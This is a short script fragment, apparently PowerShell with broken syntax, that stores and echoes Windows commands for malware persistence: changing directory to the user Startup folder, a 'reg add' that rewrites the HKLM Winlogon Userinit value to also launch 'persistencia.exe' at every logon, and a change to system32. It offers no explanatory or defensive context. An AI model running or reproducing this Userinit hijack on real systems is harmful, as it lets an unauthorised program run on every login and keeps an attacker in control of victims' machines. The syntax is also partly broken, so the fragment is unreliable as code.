

ruta1 = "cd AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"
$ruta1



ruta2 = "reg add \\\"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\\" -v Userinit -d \"Userinit.exe, persistencia.exe\" -f"
$ruta2



ruta3 = "cd \\windows\\system32"
$ruta3
